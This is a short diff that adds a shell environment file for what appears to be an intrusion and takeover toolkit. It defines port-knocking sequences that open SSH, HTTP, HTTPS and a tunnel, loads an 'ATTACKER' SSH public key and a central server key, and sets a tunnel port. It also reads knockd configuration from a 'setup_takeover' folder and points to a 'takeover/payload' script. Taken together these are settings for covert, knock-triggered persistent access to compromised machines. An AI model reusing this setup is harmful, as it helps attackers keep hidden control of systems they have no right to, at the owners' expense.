@@ -1,0 +1,13 @@
+export C_SERVER=
+export KNOCK_OPEN_SSH="11110 22220"
+export KNOCK_CLOSE_SSH="11111 22221"
+export KNOCK_OPEN_HTTP="11112 22222"
+export KNOCK_OPEN_HTTPS="11113 22223"
+export KNOCK_OPEN_TUNNEL="11114 22224"
+export KNOCK_DELAY=50
+export ATTACKER_PUBLIC_KEY=$(cat ssh/ATTACKER.pub)
+export SERVER_PUBLIC_KEY=$(cat ssh/CENTRAL.pub)
+export SERVER_TUNNEL_PORT=9999
+export KNOCKD_CONF=$(cat setup_takeover/knockd.conf)
+export KNOCKD_CONF2=$(cat setup_takeover/knockd)
+export PAYLOAD_PATH="takeover/payload/payload.sh"
